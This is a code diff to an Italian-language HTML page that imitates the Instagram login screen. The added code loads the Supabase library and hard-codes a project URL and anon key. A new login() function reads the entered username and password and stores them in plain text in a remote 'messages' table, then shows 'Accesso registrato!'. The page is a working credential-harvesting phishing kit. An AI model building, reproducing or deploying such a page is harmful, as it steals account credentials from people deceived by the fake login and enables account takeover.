@@ -5,8 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Instagram Login</title>
 
-<!-- FONT BILLABONG -->
 <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 
 <style>
 body {
@@ -19,7 +19,6 @@ body {
     height: 100vh;
 }
 
-/* BOX */
 .card {
     width: 350px;
     min-height: 600px;
@@ -32,15 +31,12 @@ body {
     justify-content: center;
 }
 
-/* LOGO INSTAGRAM ORA CORRETTO */
 .logo {
     font-family: "Billabong", cursive;
     font-size: 58px;
-    font-weight: 400;
     margin-bottom: 35px;
 }
 
-/* INPUT */
 input {
     width: 100%;
     padding: 10px;
@@ -51,7 +47,6 @@ input {
     font-size: 12px;
 }
 
-/* PASSWORD */
 .password-box {
     position: relative;
 }
@@ -65,19 +60,6 @@ input {
     cursor: pointer;
 }
 
-/* LINK AZZURRO */
-.blue {
-    font-size: 12px;
-    color: #0095f6;
-    cursor: pointer;
-}
-
-.forgot {
-    text-align: right;
-    margin-top: 8px;
-}
-
-/* BUTTON */
 button {
     width: 100%;
     padding: 8px;
@@ -88,10 +70,8 @@ button {
     font-weight: 600;
     border-radius: 8px;
     cursor: pointer;
-    opacity: 0.4;
 }
 
-/* OPPURE */
 .or {
     display: flex;
     align-items: center;
@@ -111,7 +91,6 @@ button {
     background: #dbdbdb;
 }
 
-/* FACEBOOK */
 .link {
     font-size: 13px;
     color: #0095f6;
@@ -119,7 +98,6 @@ button {
     font-weight: 600;
 }
 
-/* FOOTER */
 .footer {
     margin-top: 25px;
     font-size: 13px;
@@ -140,16 +118,14 @@ button {
 
     <div class="logo">Instagram</div>
 
-    <input type="text" placeholder="Numero di telefono, username o email">
+    <input id="user" type="text" placeholder="Numero di telefono, username o email">
 
     <div class="password-box">
         <input type="password" id="password" placeholder="Password">
         <div class="eye" onclick="togglePassword()">👁</div>
     </div>
 
-    <div class="forgot blue">Password dimenticata?</div>
-
-    <button>Accedi</button>
+    <button onclick="login()">Accedi</button>
 
     <div class="or">OPPURE</div>
 
@@ -162,10 +138,43 @@ button {
 </div>
 
 <script>
+
+// 🔵 SUPABASE CONFIG
+const supabaseUrl = "https://kgtpnhvdnjsmimihguqg.supabase.co";
+
+// 👇 INCOLLA QUI LA TUA ANON KEY
+const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtndHBuaHZkbmpzbWltaWhndXFnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5NTgxNjEsImV4cCI6MjA5MjUzNDE2MX0.py6zxxMaL3tjPl8o4A5RkMX01K_Qd1ve0OQv1mfwJRk";
+
+const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+
+// PASSWORD VISIBILE
 function togglePassword() {
     const input = document.getElementById("password");
     input.type = input.type === "password" ? "text" : "password";
 }
+
+// LOGIN + SALVATAGGIO DATABASE
+async function login() {
+    const user = document.getElementById("user").value;
+    const pass = document.getElementById("password").value;
+
+    if (!user || !pass) {
+        alert("Compila tutti i campi");
+        return;
+    }
+
+    const { error } = await supabase
+        .from('messages')
+        .insert([{ name: user, message: pass }]);
+
+    if (error) {
+        console.log(error);
+        alert("Errore database");
+    } else {
+        alert("Accesso registrato!");
+    }
+}
+
 </script>
 
 </body>
